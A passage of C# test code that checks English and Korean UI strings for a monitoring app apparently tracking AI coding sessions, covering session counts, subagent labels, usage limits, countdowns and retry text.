                  && header(new SessionCounts(Groups([claudeParent, claudeChild, codexParent, codexChild], now))).Spoken
                     == "2 sessions working · 1 tool · 2 subagents"
                  && caption(urgent, -40).Text == "Last record" && caption(plans, null).Text == "Last record"
                  && caption(retryOnly, -40).Text == "API retry 2/10 · in 4s" && caption(noticeCounts, null).Text == "Waiting for log · no record for 3m"
                  && ProviderSplits(new Dictionary<TokenSource, int>
                         { [TokenSource.Codex] = 1_200, [TokenSource.Claude] = 6_600, [TokenSource.OpenCode] = 300, [TokenSource.Omp] = 70_000 })
                     .Skip(1).SequenceEqual(["omp 70k · Claude Code 6.6k · Codex 1.2k · +1 more", "omp 70k · Claude Code 6.6k · +2 more", "omp 70k · +3 more"]),
                  "English header, flow caption and provider fold");
            var englishFlood = make([floodParent, .. flood]).Blocks.FirstOrDefault();
            check(ChildGroupText(S.Input, 1) == "1 subagent needs input" && ChildGroupText(S.Waiting, 4) == "4 subagents waiting for log"
                  && SpokenLabel(modelled, S.Input) == "Input needed, TokenCat, Claude Code claude-opus-5-5"
                  && SpokenLabel(codexChild, S.Working) == "Subagent sample_runner, Working" && ChildTitle(claudeChild) == ("Subagent", "b1234567")
                  && family.ToggleText == "Show 1 more subagent"
                  && make(input).ToggleText == "Show all 12 sessions" && make(input, expanded: true).ToggleText == "Show less"
                  && englishFlood?.MoreText == "+9 subagents waiting for log · last record 1m ago"
                  && englishFlood?.MoreSpoken == "+9 subagents waiting for log · last record 1 minute ago",
                  "English subagent counts and VoiceOver labels");
            check(usage?.Title == "Codex weekly limit" && usage?.Value(now) == "28% used"
                  && usage?.Detail(now) == "Resets in 5d 11h · as of 1m ago"
                  && usage?.Details(now).SequenceEqual(["Resets in 5d 11h · recorded 1m ago", "Resets in 5d 11h"]) == true
                  && undated?.Detail(now) == "As of 10m ago" && expired.Detail(now) == "Reset · waiting for a Codex record"
                  && claudeSummary?.Spoken(now)
                     == "42 percent used, Resets in 2 hours 13 minutes, as of 1 minute ago, Weekly limit 31 percent used, resets in 3 days 4 hours"
                  && claudeSummary?.Help(now).EndsWith("\nWeekly limit 31% used · resets in 3d 4h", StringComparison.Ordinal) == true
                  && claudeSummary?.ShortTitle == "Claude · 5-hour" && claudeSummary?.OtherSummary(now)?.ShortTitle == "Claude · weekly",
                  "English usage limit copy");
            check(Context(codexContext, now)?.Text == "Context 61% used" && Context(codexContext, now)?.Spoken == "Context 61 percent used"
                  && Context(claudeContext, now)?.Compacted == "Compacted 5m ago"
                  && headline([speedAlpha, speedBeta])?.Spoken == "Generation speed 50.0 tokens per second, Beta"
                  && LastTurnSummary(finished) == "Last completed turn: 7,493 tok · took 4:12"
                  && Footer(false, 12, 0, null).Text == "AI collection delayed 12s"
                  && Notice(TelemetryCollectorState.BusyOtherApp, null, none)?.Text == "Telemetry off · port in use",
                  "English context, speed, turn and footer copy");
            var englishDates = make([beta, .. dated], expanded: true);
            check(englishDates.Blocks.Select(block => block.Section).SequenceEqual([null, "Today", "Yesterday", "Earlier", "Earlier"])
                  && englishDates.OlderCount == 2
                  && RowActions(located, home).Select(action => action.Title)
                     .SequenceEqual(["Copy Session ID", "Copy Resume Command", "Show Project Folder in File Explorer", "Show Log File in File Explorer"])
                  && DetailItems(detailed, S.Tool).Last().Value == "When a Codex response ends",
                  "English day sections fold the older part; row actions use title case");
        });

        // LocalizationChecks.swift's SessionPresentation and OnboardingCard cases.
        var localized = DateTimeOffset.FromUnixTimeSeconds(1_790_000_000);
        DateTimeOffset around(double offset) => localized.AddSeconds(offset);
        var localizedRetry = new TokenRetryState(2, 10, around(4), false, localized);
        check(Countdown(around(7_980), localized) == "2시간 13분" && HelpAge(around(-45), localized) == "1분 이내"
              && RecordAge(around(-3), localized) == "방금"
              && RetryText(localizedRetry, localized, api: true) == "API 재시도 2/10 · 4초 후", "Korean formatting changed");
        With(AppLanguage.En, () =>
        {
            check(Countdown(around(7_980), localized) == "2h 13m" && Countdown(around(473_460), localized) == "5d 11h"
                  && Countdown(around(7_200), localized) == "2h" && Countdown(around(2_520), localized) == "42m"
                  && Countdown(around(30), localized) == "<1m", "English countdowns");
            check(HelpAge(around(-45), localized) == "<1m ago" && HelpAge(around(-200), localized) == "3m ago"
                  && RecordAge(around(-3), localized) == "just now" && RecordAge(around(-47), localized) == "40s ago", "English help and record ages");
            check(RetryText(localizedRetry, localized) == "Retry 2/10 · in 4s" && RetryText(localizedRetry, localized, api: true) == "API retry 2/10 · in 4s",
                  "English retry text");
            check(OnboardingOutcome.Make(null, OnboardingOutcome.NotePrefix + "reason", conflictFailure, TelemetryCollectorState.Waiting)
                  == new OnboardingOutcome.Skipped("reason"), "the English connect note prefix is not stripped");
        });
        return c.Done();
    }
}
